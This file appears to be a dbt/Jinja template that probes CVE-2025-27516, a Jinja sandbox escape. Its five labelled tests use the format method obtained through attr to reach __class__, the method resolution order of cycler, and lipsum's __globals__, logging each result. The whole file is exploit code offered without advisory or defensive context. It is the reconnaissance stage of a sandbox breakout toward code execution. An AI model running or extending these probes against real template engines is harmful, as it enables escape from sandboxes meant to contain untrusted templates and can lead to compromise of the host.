{# CVE-2025-27516 refined test #}
{# Test A: Basic format works? #}
{% set fA = 'hello {0}'|attr('format') %}
{{ log("TEST_A=" ~ fA('world'), info=True) }}

{# Test B: Access __class__ via format #}
{% set fB = '{0.__class__}'|attr('format') %}
{{ log("TEST_B=" ~ fB(''), info=True) }}

{# Test C: Access __class__.__name__ #}
{% set fC = '{0.__class__.__name__}'|attr('format') %}
{{ log("TEST_C=" ~ fC(''), info=True) }}

{# Test D: Try with a real object #}
{% set fD = '{0.__class__.__mro__}'|attr('format') %}
{{ log("TEST_D=" ~ fD(cycler), info=True) }}

{# Test E: lipsum.__globals__ #}
{% set fE = '{0.__globals__}'|attr('format') %}
{{ log("TEST_E_LEN=" ~ (fE(lipsum) | length), info=True) }}

SELECT 1 as id
